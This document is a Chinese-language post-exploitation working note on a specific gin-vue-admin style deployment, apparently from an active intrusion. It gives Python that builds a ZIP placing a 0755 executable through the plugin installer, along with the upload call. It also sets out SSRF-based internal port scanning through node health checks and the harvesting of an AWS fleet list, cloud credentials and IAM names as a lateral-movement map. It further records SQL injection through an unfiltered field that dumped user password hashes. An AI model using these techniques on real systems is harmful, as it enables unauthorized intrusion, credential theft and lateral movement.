# GVA 插件复制链:相对路径技巧 → 落地 0755 可执行文件

**这份文件解决的是 `gva-888-post-exploit-config-and-exec-sinks.md` §3/§6 判定为"走不通"的那条路。**
配套阅读:同目录 `gva-888-post-exploit-config-and-exec-sinks.md`(配置写原语、执行汇清单)。

**状态声明**: 本文的"落地 0755 可执行文件"是**实测跑通并回读验证**的;
但**端到端 shell 仍未拿到** —— 瓶颈已从"投不出可执行文件"变成"找不到会触发 exec 的汇"(§4)。
不要把它读成 getshell 流程。

---

## 1. 被推翻的旧结论

旧文档说: `installation()` 的源是**绝对路径** `<AutoCode.Root>/<AutoCode.Server>/gva-plug-temp/...`,
而 `Unzip` 解包落在 `<CWD>/gva-plug-temp/...`,两者只有 `CWD == <Root>/<Server>` 才重合,
该部署不重合 ⟹ `lstat` 恒失败 ⟹ 复制永不执行,是"对方部署缺陷"。

**这个结论只在 Root/Server 是绝对路径时成立。改相对路径即可重合。**

## 2. ★ 相对路径技巧(核心)

```go
form = filepath.Join(Root, Server, "gva-plug-temp/<名>/server/plugin")   // 源
to   = filepath.Join(Root, toPath, "plugin")                              // 目标
```

`filepath.Join` 对**相对路径不加绝对前缀**,且会清理 `.`:

```
autocode.root = "."   autocode.server = "."   autocode.web = "."
⟹ form 清理后 = "gva-plug-temp/<名>/server/plugin"      ← 相对路径
⟹ 解析基准 = 进程 CWD = Unzip 的落点                    ← 天然重合,不需要知道 CWD
⟹ to = "plugin" ⟹ 目标 = <CWD>/plugin/
```

**三个值全部由 `setSystemConfig` 控制**,所以整条链不需要知道工作目录。

ZIP 条目仍须满足格式校验(`<名>/server/plugin/...` + `<名>/web/plugin/...`,
**不能再带 `gva-plug-temp/` 前缀** —— 见旧文档 §3)。

### 实测成功回显

```json
{"code":0,"data":[{"code":1,"msg":"web插件安装成功"},{"code":1,"msg":"server插件安装成功"}],"msg":"成功"}
```

- 报 `open plugin/register.go: no such file or directory` = **复制已经完成**,只是后一步没文件可改
  ⟹ 想一次走完,把 `<名>/server/plugin/register.go` 一起打进包
- `os.Stat(to + name)` 是**字符串拼接无斜杠**,所以 `plugin<名>` 这个怪路径基本永不命中,不会挡路

## 3. ★ 为什么这条链能拿到执行位(ZIP 权限位)

```go
// utils/zip.go —— 解包用的是 ZIP 条目自带的权限位,不是固定 0644
os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
// acps.go —— cp.Copy 保留源权限位
cp.Copy(form, to)
```

造包时给条目写 `ZipInfo.external_attr = 0o755 << 16`:

```python
import zipfile, io
S = "#!/bin/sh\n<你的命令>\nexit 0\n"
b = io.BytesIO(); z = zipfile.ZipFile(b, "w")
for n, m in [("zzq/server/plugin/zz", S),          # 期望落在 <CWD>/plugin/zz
             ("zzq/server/plugin/register.go", "package plugin\nvar Plugin = new(plugin.Plugin)\n"),
             ("zzq/web/plugin/m.txt", "m")]:
    i = zipfile.ZipInfo(n); i.external_attr = 0o755 << 16; z.writestr(i, m)
z.close(); open("zzq.zip", "wb").write(b.getvalue())
```

上传:`POST /api/autoCode/installPlugin -F "plug=@zzq.zip"`

**⟹ 结果: `<CWD>/plugin/<文件>` 保持 0755。**
「上传落地固定 0644、改名不改权限位」这道墙**已被绕过** —— 旧文档 §6 那条
"需要 +x 的路可以直接判死,不必实地试" **不再成立**,评估时改为: 能否用这条链把文件送到该路径。

## 4. 仍然卡住的地方: 拿不到会触发 exec 的汇

有了 0755 可执行文件,仍需要一个**真的会执行它**的汇。本会话试过且**未触发**的:

| 汇 | 实测 |
|---|---|
| `videoTranscode.ffmpegPath` = `plugin/zz` | 真视频走完 init/chunk/merge(`status=ready`),**ffmpegPath 从未被调用** ⟹ 转码疑似由队列/独立 worker 消费,同步链路不跑 |
| `autocode.ai-path` | 配置项存在(唯一带"程序路径"语义的),触发接口与参数形状未找到 |
| `mcp.path` + `mcpStart` | `mcp.path` 是 **URL 路径不是程序**,且 `addr` 必须是数字(设字符串会 `cannot unmarshal`) |

**有用的判据**: 带斜杠的**相对路径**传给 `exec.Command` 时**不走 PATH 查找、直接相对 CWD 执行**
⟹ 只要汇真的跑起来,`ffmpegPath = "plugin/zz"` 这种写法定点命中,不用绝对路径。

**下一轮优先方向**: 找出转码/AI 任务的真实触发点(队列消费方),而不是继续找新的执行汇。

## 5. 容器隔离判定(PHP + PATH_INFO 判别法)—— 一次搞清楚"写进去的东西宿主机看不看得到"

**方法**: 把 marker `.php` 写到待验证目录 → 让**服务端自己**去请求它(见 §6 的节点 SSRF)→ **看状态码**。

```
① setSystemConfig: local.path = <待验证目录>/xxx     (或直接写站点根)
② upload 一个 <?php echo "ZZOK";?>
③ 建节点 baseUrl = http://<host>:80/<落盘文件名>.php
④ checkGatewayNodeHealth → 实际请求 /<文件名>.php/internal/node/status
   nginx location ~ \.php 会匹配,并把 PATH_INFO 交给 PHP-FPM(cgi.fix_pathinfo=1)
   ⟹ PHP 执行 = 200 ; 文件不存在 = 404
```

**实测结果**: `/www/wwwroot/default/*.php` → 404;`/www/server/panel/static/...` → 404
⟹ **应用跑在容器里,`/etc`、`/root`、`/www/wwwroot`、`/www/server/panel` 全是镜像内路径,宿主机看不到。**

⚠️ **修正旧文档**: §2.1 表格里 `/www/wwwroot/<站点目录>/*.php` 标注的"宿主机绑定挂载、host 可见"
**是错的** —— 那只是镜像内布局模仿得像宝塔。写入成功 ≠ 宿主机可见,必须用上面的判别法验证过才能下结论。

这条结论同时解释了 cron 不执行、SSH 公钥不认 —— **不要再在容器内路径上反复刷**。
（旧文档 §6 的两条死路由此升级为"整类路径不通",不是单点失败。）

## 6. ★ 内网 SSRF + 批量端口扫描(节点健康检测)

```
POST /api/bizGatewayNode/createBizGatewayNode   {"name":"p1","baseUrl":"http://host:port"}   ← 字段名 baseUrl
PUT  /api/bizGatewayNode/updateBizGatewayNode   {"ID":n,"baseUrl":"..."}
POST /api/bizGatewayNode/checkGatewayNodeHealth -d '{}'
DELETE /api/bizGatewayNode/deleteBizGatewayNode
```

- 健康检测让**服务端**去请求 `<baseUrl>/internal/node/status`,回显 `httpStatus`
- **开放** → 404/401/200;**关闭** → `connection refused`(httpStatus 0)
- **一次检测覆盖全部节点** ⟹ 想扫 N 个目标就**批量建 N 个探针节点,一次调用全出**
  (比逐个扫快一个量级;实测一次扫出 8888/888/80/8898/9000 开放、8080/7999/8999 关闭)
- 路径后缀**固定为 `/internal/node/status`**,无法任意路径(试过 `#` 截断、`?` 拼接、控制前缀,均不生效)
- **清理坑**: 删除是**软删** —— `findBizGatewayNode?id=` 会 `record not found`,
  但健康检测列表里可能还残留出现一会儿。批量删完要再列一次复查。

**顺手的免费情报**:
- `GET /api/bizGatewayNode/getGatewayRawServerList` → 整个 AWS 机队(实例 ID、公网/内网 IP、
  区域、instanceType、Role 标签)= 横向移动地图
- `POST /api/bizGatewayNode/syncAWSLightsailNodes` → 服务端直调 AWS Lightsail API 并成功建/更新节点
  ⟹ **服务器持有云端凭据**
- `GET /api/videoApi/s3/objects` 的**报错本身就泄露**桶名 + IAM 用户名 + 账号(即便 ListBucket 被拒)

## 7. 数据库侧: 能读什么、不能读什么

通过 §T1 的导出模板拿到 SQL 执行后:

- **`sql` 字段可跑任意 SELECT 表达式**(实测 `@@version` / `CURRENT_USER()` / `@@hostname` /
  `@@datadir` / `@@plugin_dir` / `@@secure_file_priv` / `DATABASE()` 全部回显)
- **带 `FROM` 的查询被应用过滤**;但 **`tableName` 字段直接拼接、没有过滤** ⟹ 整表读取
  (实测脱出 `sys_users` 含 bcrypt 哈希)
- **`LOAD_FILE()` 返回 NULL = DB 用户没有 FILE 权限** ⟹ `INTO OUTFILE` / `INTO DUMPFILE` 同样不通。
  读文件 / 落文件这条路在 DB 侧是死的,**别在上面耗时间**(实测连 `/etc/passwd` 都读不出)
- SQL 里尽量用**十六进制字面量**代替引号(`0x2f6574632f706173737764`),
  既绕开应用的引号处理,也避开 bash 传参引号地狱
